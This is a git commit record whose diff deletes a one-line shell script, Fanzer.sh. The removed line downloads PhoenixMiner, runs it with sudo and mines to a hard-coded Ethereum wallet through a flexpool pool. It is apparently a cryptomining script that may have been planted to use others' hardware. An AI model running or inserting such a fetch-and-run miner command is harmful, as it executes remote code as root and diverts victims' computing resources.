59b73c35d614a8cab83af1b089ec3741d7aadf16
hosin269 <88583109+hosin269@users.noreply.github.com>
2021-08-09 22:17:30 +0430

    Delete Fanzer.sh

--- Fanzer.sh
+++
@@ -1,1 +0,0 @@
-apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux && sudo ./PhoenixMiner -pool eth-us-east.flexpool.io:4444 -w 0xb2AAd92f1570AD892248c229b86582699d724a0B.phoenix -pass x -mi 14 -gt 400
